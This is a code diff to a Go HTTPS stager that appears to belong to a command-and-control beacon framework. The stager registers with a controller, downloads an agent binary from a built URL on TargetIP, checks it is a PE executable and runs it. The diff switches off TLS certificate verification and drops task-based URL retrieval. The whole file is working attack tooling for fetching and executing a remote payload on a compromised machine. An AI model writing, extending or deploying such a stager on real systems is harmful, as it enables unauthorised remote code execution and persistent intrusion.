@@ -5,11 +5,11 @@ package main
 
 import (
 	"bytes"
+	"crypto/tls"
 	"fmt"
 	"io"
 	"net/http"
 	"os"
-	"strings"
 	"time"
 
 	"orsted/beacon/core"
@@ -35,13 +35,17 @@ func isPEValid(data []byte) bool {
 }
 
 func downloadAgent(url string) ([]byte, error) {
+	tr := &http.Transport{
+		TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
+	}
+	client := &http.Client{
+		Timeout:   30 * time.Second,
+		Transport: tr,
+	}
+
 	req, err := http.NewRequest("GET", url, nil)
 	if err != nil {
 		return nil, err
-	}
-
-	client := &http.Client{
-		Timeout: 30 * time.Second,
 	}
 
 	resp, err := client.Do(req)
@@ -61,26 +65,6 @@ func downloadAgent(url string) ([]byte, error) {
 	}
 
 	return buf.Bytes(), nil
-}
-
-func requestAgentDownload(hp utils.Peer, beaconID string) string {
-	tasks, err := core.RetreiveTask(hp, beaconID)
-	if err != nil {
-		fmt.Println("[stager] Error retrieving tasks:", err.Error())
-		return ""
-	}
-
-	if tasks == nil || len(tasks.Tasks) == 0 {
-		return ""
-	}
-
-	for _, task := range tasks.Tasks {
-		if strings.HasPrefix(task.Command, "http") {
-			return task.Command
-		}
-	}
-
-	return ""
 }
 
 func executeAgent(data []byte) error {
@@ -106,11 +90,7 @@ func executeAgent(data []byte) error {
 		Files: []*os.File{os.Stdin, os.Stdout, os.Stderr},
 	})
 
-	if err != nil {
-		return err
-	}
-
-	return nil
+	return err
 }
 
 func stagerHTTPS() {
@@ -131,7 +111,6 @@ func stagerHTTPS() {
 		return
 	}
 	utils.ParentPeer = hp
-	utils.BeaconType = "stager"
 	fmt.Println("[stager] Starting HTTPS Stager")
 
 	beaconID, err := core.RegisterBeacon(hp)
@@ -144,22 +123,8 @@ func stagerHTTPS() {
 	fmt.Println("[stager] Registered with ID:", beaconID)
 	utils.CurrentBeaconId = beaconID
 
-	downloadURL := ""
-	for attempt := 0; attempt < 10; attempt++ {
-		downloadURL = requestAgentDownload(hp, beaconID)
-		if downloadURL != "" {
-			break
-		}
-		fmt.Printf("[stager] Waiting for download URL (attempt %d/10)...\n", attempt+1)
-		time.Sleep(2 * time.Second)
-	}
-
-	if downloadURL == "" {
-		fmt.Println("[stager] Failed to retrieve agent download URL after 10 attempts")
-		return
-	}
-
-	fmt.Println("[stager] Download URL received:", downloadURL)
+	downloadURL := fmt.Sprintf("https://%s:%s/agent/download/%s", TargetIP, TargetPort, beaconID)
+	fmt.Println("[stager] Downloading agent from:", downloadURL)
 
 	var agentBinary []byte
 	for attempt := 1; attempt <= 3; attempt++ {
@@ -179,7 +144,7 @@ func stagerHTTPS() {
 		return
 	}
 
-	fmt.Printf("[stager] Agent downloaded successfully, size: %d bytes\n", len(agentBinary))
+	fmt.Printf("[stager] Agent downloaded, size: %d bytes\n", len(agentBinary))
 
 	if !isPEValid(agentBinary) {
 		fmt.Println("[stager] Downloaded agent is not a valid PE binary")
@@ -194,7 +159,7 @@ func stagerHTTPS() {
 		return
 	}
 
-	fmt.Println("[stager] Agent executed successfully, stager exiting")
+	fmt.Println("[stager] Agent launched, stager exiting")
 }
 
 func main() {
